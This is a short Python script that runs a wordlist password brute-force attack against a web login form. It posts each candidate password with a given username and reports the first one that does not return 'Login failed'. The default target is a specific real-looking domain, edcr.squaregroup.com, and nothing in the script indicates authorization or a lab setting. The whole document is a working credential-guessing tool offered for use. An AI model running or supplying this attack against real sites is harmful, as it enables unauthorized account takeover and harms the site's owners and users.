import requests
from colorama import Fore, Style, init
import time
import os

# Initialize colorama for colored output
init(autoreset=True)

# Function to perform brute-force attack using a wordlist
def brute_force_with_wordlist(target_url, username, wordlist_file="wordlist.txt"):
    print(Fore.YELLOW + "[*] Starting brute-force attack with wordlist...")
    start_time = time.time()  # Start timer

    # Check if the wordlist file exists
    if not os.path.exists(wordlist_file):
        print(Fore.RED + f"[-] Error: Wordlist file '{wordlist_file}' not found.")
        return

    try:
        # Open the wordlist file
        with open(wordlist_file, 'r') as file:
            passwords = file.read().splitlines()  # Read all passwords into a list

        # Try each password from the wordlist
        for password in passwords:
            if not password.strip():  # Skip empty lines
                continue

            # Prepare the payload for the POST request
            payload = {
                'username': username,
                'password': password.strip()  # Remove any extra whitespace
            }
            
            try:
                # Send a POST request to the target URL
                response = requests.post(target_url, data=payload, timeout=5)
                
                # Check if the login was successful (customize this based on the response)
                if "Login failed" not in response.text:  # Replace with the actual success condition
                    print(Fore.GREEN + f"[+] Success! Username: {username}, Password: {password}")
                    print(Fore.GREEN + f"[+] Time taken: {time.time() - start_time:.2f} seconds")
                    return  # Stop the script if the password is found
                else:
                    print(Fore.RED + f"[-] Failed attempt: Password = {password}")
            
            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"[-] Error: {e}")
                continue  # Continue to the next password if an error occurs

    except Exception as e:
        print(Fore.RED + f"[-] An unexpected error occurred: {e}")
        return

    print(Fore.YELLOW + "[*] Brute-force attack completed. No password found.")

# Main program
if __name__ == "__main__":
    # Default target URL and wordlist file
    default_target_url = "https://edcr.squaregroup.com/"
    default_wordlist_file = "wordlist.txt"

    # Input target URL (use default if not provided)
    target_url = input(f"Enter the target URL (default: {default_target_url}): ") or default_target_url
    
    # Input username
    username = input("Enter the username: ")
    
    # Input wordlist file (use default if not provided)
    wordlist_file = input(f"Enter the path to the wordlist file (default: {default_wordlist_file}): ") or default_wordlist_file
    
    # Start the brute-force attack
    brute_force_with_wordlist(target_url, username, wordlist_file)